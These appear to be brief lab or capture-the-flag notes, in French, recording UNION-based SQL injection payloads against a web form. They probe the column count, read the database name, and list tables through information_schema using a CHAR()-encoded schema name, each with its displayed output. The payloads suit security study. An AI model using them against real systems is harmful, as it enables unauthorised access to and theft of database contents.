    1 UNION SELECT 1, 2
    1 UNION SELECT 1, database()
        Cela affiche: Member_images

    1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,105,109,97,103,101,115,10)
       Cela affiche: Nsa
